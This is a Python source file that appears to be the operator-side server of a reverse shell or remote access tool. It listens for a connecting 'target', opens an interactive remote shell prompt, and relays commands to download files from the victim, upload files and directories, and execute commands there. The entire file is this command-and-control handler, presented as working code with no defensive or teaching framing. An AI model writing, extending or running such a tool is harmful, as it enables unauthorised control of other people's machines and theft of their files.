import socket
import os
import server_config
import communication as comm
import command as cmd


def target_communication(s: socket.socket, ip: str, verbose=False):
    command_buffers: list[str] = []

    while True:
        if command_buffers:
            command = command_buffers.pop(0)
            if input(f"[buffer] execute -> {command}? (Y/N):") != "Y":
                continue
        else:
            command = input(f"* Shell~{ip}: ")

        comm.send(s, command, verbose)

        func, args = cmd.extract_command(command)

        # quit
        if func == "quit":
            break
        # clear
        elif func == "clear":
            os.system("clear")
        elif func == "cd":
            pass
        # (download|upload) [source] [target]
        elif func == "download":
            cmd.download_file(s, args, verbose)
        elif func == "upload":
            cmd.upload_file(s, args, verbose)
        # upload_dir [source_dir] [target_dir]
        elif func == "upload_dir":
            cmd.upload_dir(args, command_buffers, verbose)
        # exec [func] [...args]
        elif func == "exec":
            cmd.recv_exec_command(s)


if __name__ == "__main__":
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.bind((server_config.IP, server_config.PORT))
    print("[+] Listening for incoming connections")
    sock.listen(5)
    target, ip = sock.accept()
    print("[+] Target Connected From: " + str(ip))
    try:
        target_communication(target, str(ip), verbose=server_config.SERVER_VERBOSE)
    except Exception as e:
        print("[error]", e)
        target.close()
        sock.close()
